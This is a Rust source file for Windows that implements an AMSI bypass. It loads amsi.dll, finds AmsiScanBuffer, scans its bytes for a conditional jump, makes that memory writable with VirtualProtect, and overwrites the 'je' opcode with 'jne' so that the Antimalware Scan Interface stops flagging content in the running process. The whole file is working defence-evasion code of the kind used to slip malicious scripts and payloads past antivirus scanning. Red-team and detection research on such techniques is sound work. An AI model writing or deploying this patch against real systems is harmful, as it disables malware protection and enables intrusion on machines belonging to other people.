use std::ffi::c_void;
use std::ptr::null_mut;
use std::slice::from_raw_parts;
use windows::core::{s, Error, Result, PCSTR};
use windows::Win32::System::LibraryLoader::{
    GetProcAddress, LoadLibraryA
};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, 
    PAGE_PROTECTION_FLAGS
};

fn main() -> Result<()> {
    let name = c"AmsiScanBuffer";
    unsafe {
        // Opcode that will be injected (0x75 -> 'jne')
        let patch_opcode = 0x75u8;
        
        // Load the AMSI.dll library
        let h_module = LoadLibraryA(s!("AMSI"))?;

        // Retrieve the address of the AmsiScanBuffer function
        let address = GetProcAddress(h_module, PCSTR(name.as_ptr().cast()))
            .ok_or_else(|| Error::from_win32())? as *const u8;

        // Pattern to search for: ret + int3 + int3
        let pattern = [0xC3, 0xCC, 0xCC];
        let mut p_patch_address = null_mut();
        let bytes = from_raw_parts(address as *const u8, 0x1000 as usize);
        
        // Search for the pattern within the buffer
        if let Some(x) = bytes.windows(pattern.len()).position(|window| window == pattern) {
            // Reverse scan to find the conditional jump instruction ('je')
            for i in (0..x).rev() {
                if bytes[i] == 0x74 {
                    let offset = bytes.get(i + 1).copied().unwrap_or(0);
                    let target_index = i.wrapping_add(2).wrapping_add(offset as usize);

                    // Confirm that the jump leads to a 'mov eax, imm32' instruction
                    if bytes.get(target_index) == Some(&0xB8) {
                        p_patch_address = (address.add(i)) as *mut c_void;
                        break;
                    }
                }
            }
        }

        if p_patch_address.is_null() {
            return Err(Error::from_win32());
        }

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // Change memory protection to allow writing
        VirtualProtect(p_patch_address, 1, PAGE_EXECUTE_READWRITE, &mut old_protect)?;
        
        // Write the patch opcode ('jne')
        *(p_patch_address as *mut u8) = patch_opcode;

        // Restore the original memory protection
        VirtualProtect(p_patch_address, 1, old_protect, &mut old_protect)?;
    }

    Ok(())
}

